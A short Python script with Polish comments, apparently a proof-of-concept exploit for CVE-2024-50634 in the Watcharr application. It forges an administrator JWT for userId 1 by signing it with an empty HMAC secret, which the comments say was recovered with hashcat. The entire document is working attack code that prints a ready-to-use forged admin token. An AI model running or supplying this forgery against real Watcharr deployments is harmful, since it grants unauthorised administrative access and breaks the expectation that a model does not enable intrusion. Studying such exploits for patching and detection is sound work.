#!/usr/bin/env python3
# CVE-2024-50634 (Watcharr) - podrobienie tokena admina PUSTYM sekretem JWT.
# Sekret zlamany hashcatem (tryb 16500) okazal sie pustym stringiem "".
import base64, json, hmac, hashlib

def b64url(b):
    return base64.urlsafe_b64encode(b).decode().rstrip('=')

SECRET = b""                      # <-- pusty sekret (podatnosc)
header  = {"alg": "HS256", "typ": "JWT"}
payload = {"userId": 1, "username": "admin", "type": 0,
           "iss": "watcharr", "iat": 1793013555}   # userId 1 = admin

h = b64url(json.dumps(header,  separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
sig = b64url(hmac.new(SECRET, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{sig}")
